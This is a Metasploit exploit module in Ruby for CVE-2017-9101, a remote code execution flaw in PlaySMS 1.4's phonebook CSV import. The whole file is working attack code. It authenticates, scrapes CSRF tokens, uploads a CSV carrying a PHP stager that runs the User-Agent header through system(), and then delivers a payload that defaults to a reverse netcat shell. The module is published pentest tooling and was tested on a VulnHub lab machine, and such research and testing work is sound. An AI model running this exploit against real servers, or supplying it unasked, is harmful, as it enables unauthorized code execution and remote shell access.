class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

    def initialize(info = {})
        super(update_info(info,
        'Name' => 'PlaySMS 1.4 - import.php, CSV file upload Remote Code Execution',
        'Description' => %q{
            PlaySMS 1.4 - import.php (aka the Phonebook import feature), CSV file upload with milicious payload
            Remote Code Execution via vectors involving the User-Agent HTTP header and PHP code in the User-Agent.

            This module was tested against PlaySMS 1.4 on VulnHub's Dina 1.0 machine.
        },
        'Author' =>
            [
                'Touhid M.Shaikh <admin[at]touhidshaikh.com>' # Discoverys and Metasploit Module
            ],
        'License' => MSF_LICENSE,
        'References' =>
            [
                ['CVE','2017-9101'],
                ['EDB', '42044']
            ],
        'DefaultOptions' =>
            {
                'SSL'     => false,
                'PAYLOAD' => 'cmd/unix/reverse_netcat',
            },
        'Privileged' => false,
        'Platform'   => ['unix'],
        'Arch'       => ARCH_CMD,
        'Targets' =>
            [
                [ 'PlaySMS 1.4', { } ],
            ],
        'DefaultTarget'  => 0,
        'DisclosureDate' => 'May 21 2017'))

        register_options(
            [
                OptString.new('TARGETURI', [ true, "Base playsms directory path", '/playsms']),
                OptString.new('USERNAME', [ true, "Username to authenticate with", 'admin']),
                OptString.new('PASSWORD', [ true, "Password to authenticate with", 'password'])
            ])

    end

    def uri
        return target_uri.path
    end

    def check
        res = nil
        begin
            res = send_request_cgi({ 
                'method' => 'GET',
                'uri' => normalize_uri(uri, 'index.php') 
            })
        rescue
            vprint_error("Unable to access the index.php file")
            return CheckCode::Unknown
        end

        if res.code == 302 && res.headers['Location'].include?("index.php?app=main&inc=core_auth&route=login")
            return Exploit::CheckCode::Appears
        end  

        return CheckCode::Safe
    end

    def login
        res = send_request_cgi({ 
            'uri' => normalize_uri(uri, 'index.php'),
            'method' => 'GET',
            'vhost' => "#{rhost}:#{rport}",
            'vars_get' => {
                'app' => 'main',
                'inc' => 'core_auth',
                'route' => 'login',
            }
        })

        # Grabbing CSRF token from body
        /name="X-CSRF-Token" value="(?<csrf>[a-z0-9"]+)">/ =~ res.body
        fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine CSRF token") if csrf.nil?     
        vprint_good("X-CSRF-Token for login : #{csrf}")

        cookies = res.get_cookies
        print_status("Trying to Login ......")
        # Send Creds with cookies.    
        res = send_request_cgi({
            'method' => 'POST',
            'uri' => normalize_uri(uri, 'index.php'),
            'cookie' => cookies,
            'vars_get' => {
                'app' => 'main',
                'inc' => 'core_auth',
                'route' => 'login',
                'op' => 'login',
            },
            'vars_post' => {
                'X-CSRF-Token' => csrf,
                'username' => datastore['USERNAME'],
                'password' => datastore['PASSWORD']
            },
        })

        unless res
            fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to Login request")
        end

        # Try to access index page with authenticated cookie.
        res = send_request_cgi({
            'method' => 'GET',
            'uri' => normalize_uri(uri, 'index.php'),
            'cookie' => cookies,
        })

        # if we redirect to core_welcome dan we assume we have authenticated cookie.
        if res.code == 302 && res.headers['Location'].include?('index.php?app=main&inc=core_welcome')
            print_good("Authentication successful: #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
            return cookies
        else
            fail_with(Failure::UnexpectedReply, "#{peer} - Authentication Failed :[ #{datastore['USERNAME']}:#{datastore['PASSWORD']} ]")
            return nil
        end
    end


    # Tested successfully on Dina: 1.0.1 machine on vulnhub.
    # Link : https://www.vulnhub.com/entry/dina-101,200/
    def exploit

        cookies = login

        # Agian CSRF token.
        res = send_request_cgi({ 
            'uri' => normalize_uri(uri, 'index.php'),
            'method' => 'GET',
            'vhost' => "#{rhost}:#{rport}",
            'cookie' => cookies,
            'vars_get' => {
                'app' => 'main',
                'inc' => 'feature_phonebook',
                'route' => 'import',
                'op' => 'list',
            }
        })

        unless res
            fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to Login request")
        end
        
        # Grabbing CSRF token from body
        /name="X-CSRF-Token" value="(?<csrf>[a-z0-9"]+)">/ =~ res.body
        fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine CSRF token") if csrf.nil?     
        vprint_good("X-CSRF-Token for upload : #{csrf}")

        # Payload.
        stager = "<?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>"
        
        #making csv file body
        final_stager = "Name,Email,Department\n"
        final_stager << stager
        final_stager <<',2,3'
        
        # setup POST request.
        post_data = Rex::MIME::Message.new
        post_data.add_part(csrf, content_type = nil, transfer_encoding = nil, content_disposition = "form-data; name=\"X-CSRF-Token\"") # CSRF token
        post_data.add_part(final_stager, content_type = "text/csv", transfer_encoding = nil, content_disposition = "form-data; name=\"fnpb\"; filename=\"agent22.csv\"")  #payload
        data = post_data.to_s

        print_status("Trying to upload malicious CSV file ....")
        # Lets Send Upload request.
        res = send_request_cgi({ 
            'uri' => normalize_uri(uri, 'index.php'),
            'method' => 'POST',
            'vhost' => "#{rhost}:#{rport}",
            'agent' => payload.encode,
            'cookie' => cookies,
            'vars_get' => {
                'app' => 'main',
                'inc' => 'feature_phonebook',
                'route' => 'import',
                'op' => 'import',
            },
            'headers' => {
                'Upgrade-Insecure-Requests' => '1',
            },
            'Connection' => 'close',
            'data' => data,
            'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
        })
    end
end